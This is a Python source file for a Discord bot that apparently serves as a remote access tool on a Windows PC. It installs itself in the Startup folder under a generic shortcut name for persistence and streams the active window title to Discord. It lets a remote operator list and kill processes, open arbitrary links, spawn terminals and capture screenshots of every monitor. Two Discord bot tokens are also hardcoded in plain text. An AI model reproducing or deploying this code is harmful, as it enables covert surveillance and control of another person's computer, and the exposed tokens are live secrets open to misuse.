import discord
import pywinctl
import subprocess
import time
import psutil
import pyautogui
import io
import PIL
import os
import win32com.client
import keyboard
import sys
import pywinctl
from discord import option
from pywinauto import Desktop
import psutil
import webbrowser
from discord.ext import tasks
import win32gui
import win32process
import psutil
from pywinauto.application import Application
import mss
from PIL import Image


# Replace with your bot token and channel ID
# TOKEN = "MTM5MTI0OTMzMjM5MjU1ODYyMg.GjMXeD.4gM7CA7JvUqHl6JhbrUQrhWaRU_uAqBvVTkcng" # MAIN
TOKEN = "MTM5MTgyNjUxNDA1OTcyNzAwMA.G-1-Ad.VtaKR-33aMWne8JfgseJSQlw8d-LYXu9p7alrM" # TESTING

# CHANNEL_ID = 1391249089152155769  # MAIN
CHANNEL_ID = 1391826973432483931  # TESTING

intents = discord.Intents.default()
intents.message_content = True  # Needed to read message content
intents.guilds = True
intents.messages = True

bot = discord.Bot(intents=intents, guilds=[discord.Object(id=1391249088695238828)])

lastText = ""

@tasks.loop(seconds=.5)
async def activityChanger():
    global lastText
    if pywinctl.getActiveWindowTitle() != lastText:
        lastText = pywinctl.getActiveWindowTitle()
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=lastText))

@bot.event
async def on_ready():
    await bot.wait_until_ready()
    channel = bot.get_channel(CHANNEL_ID)
    await channel.send(content="Beeto has logged in!")
    await channel.send(content="https://tenor.com/view/sonic-devil-diabolique-evil-gif-9725651736562738158")
    activityChanger.start()


# @client.event
# async def on_message(message):
#     # Ignore bot's own messages
#     if message.author == client.user:
#         return

#     # Only log messages from the specific channel
#     if message.channel.id == TARGET_CHANNEL_ID:
#         if message.content.lower() == "what is running":
#             string = "# Active windows:\n"
#             for window in pywinctl.getAllWindows():
#                 if window.title != "":
#                     string += f"## - {window.title}\n"
#             await message.channel.send(string)
#         if message.content.lower() == "close roblox":
#             closeWindow("roblox")
#             await message.channel.send("Closed Ro/pblox")
#         if message.content.lower() == "close chrome":
#             closeWindow("chrome")
#             await message.channel.send("Closed chrome")
#         if message.content.lower() == "open terms":
#             startTerms()
#             await message.channel.send("opened terms")
#         if message.content.lower() == "ss roblox":
#             if pywinctl.getActiveWindowTitle().lower() == "roblox":
#                 screenshot = pyautogui.screenshot()
#                 buffer = io.BytesIO()
#                 screenshot.save(buffer, format="PNG")
#                 buffer.seek(0)
#                 await message.channel.send("Screenshot of Roblox", file=discord.File(buffer, filename="screenshot.png"))
#             else:
#                 await message.channel.send("Roblox is not open")
#         if message.content.lower() == "minimize all":
#             keyboard.send("windows+d")
            
#             await message.channel.send(f"Done") 

def get_original_exe_path():
    # sys._MEIPASS only exists in PyInstaller bundle mode
    if hasattr(sys, '_MEIPASS'):
        # Running from a PyInstaller onefile EXE
        return os.path.abspath(sys.argv[0])  # This points to the *original .exe* file on disk
    else:
        # Running from source (.py)
        return os.path.abspath(__file__)

def startTerms(num):
    procs = []

    for _ in range(num):
        proc = subprocess.Popen(
            "cmd", creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        procs.append(proc)

    time.sleep(2)

    for proc in procs:
        try:
            psutil.Process(proc.pid).terminate()
            time.sleep(0.05)
        except psutil.NoSuchProcess:
            pass


def startUpCheck():
    actual_exe = get_original_exe_path()

    shell = win32com.client.Dispatch("WScript.Shell")
    startup = shell.SpecialFolders("Startup")
    shortcut_path = os.path.join(startup, "DesktopStartUp.lnk")

    if not os.path.exists(shortcut_path):
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = actual_exe  # ✅ the original EXE on disk
        shortcut.WorkingDirectory = os.path.dirname(actual_exe)
        shortcut.IconLocation = actual_exe
        shortcut.Save()
    
def get_windows():
    listOfProcess = []
    windows = Desktop(backend="uia").windows()
    for w in windows:
        title = w.window_text().strip()
        if not title:
            continue

        try:
            pid = w.process_id()
            proc = psutil.Process(pid)
            exe_name = proc.name().lower()
        except Exception:
            exe_name = "unknown"

        if exe_name == "explorer.exe":
            continue

        listOfProcess.append((exe_name, title))
    
    return listOfProcess

def get_pid(target):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == target.lower():
            return int(proc.info['pid'])

def kill_all_processes(target_name: str):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == target_name.lower():
            try:
                proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                raise Exception(f"Cant kill process (probably not running or AV protection): {e}")



@bot.slash_command(name="ping", description="pong")
async def ping(ctx: discord.ApplicationContext):
    await ctx.defer()
    await ctx.respond("Pong!")


@bot.slash_command(name="running", description="List of running applications")
async def running(ctx: discord.ApplicationContext):
    await ctx.defer()
    windows = get_windows()
    out = "# Active windows:\n```cs\n"
    for w in windows:
        out += f"[{w[0]}] {w[1]}\n"
    out += "```"
    await ctx.respond(out)

@bot.slash_command(name="kill", description="Pick a process to kill")
@option(
    "process",
    description="list of process",
    choices=[w[0] for w in get_windows()],
)
async def kill(ctx: discord.ApplicationContext, process: str):
    await ctx.defer()
    kill_all_processes(process)
    await ctx.respond(f"Killed {process}")


@bot.slash_command(name="link", description="open a link in default browser")
async def link(ctx: discord.ApplicationContext, link: str = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
    await ctx.defer()
    webbrowser.open(link)
    await ctx.respond(f"Opened {link}")

@bot.slash_command(name="terms", description="open and close terminals")
async def terms(ctx: discord.ApplicationContext, amount: int = 5):
    await ctx.defer()
    startTerms(amount)
    await ctx.respond(f"Opened and closed {amount} terminals")


@bot.slash_command(name="screenshot", description="take a screenshot")
async def ping(ctx: discord.ApplicationContext):
    await ctx.defer()

    files = []

    with mss.mss() as sct:
        for i, monitor in enumerate(sct.monitors[1:], start=1):
            img = sct.grab(monitor)
            image = Image.frombytes("RGB", img.size, img.rgb)

            buffer = io.BytesIO()
            image.save(buffer, format="PNG")
            buffer.seek(0)

            file = discord.File(fp=buffer, filename=f"monitor_{i}.png")
            files.append(file)

    await ctx.respond(content=pywinctl.getActiveWindowTitle(), files=files)

@bot.event
async def on_application_command_error(ctx, error):
    await ctx.respond(f"❗ Error: {str(error)}")

            
bot.run(TOKEN)
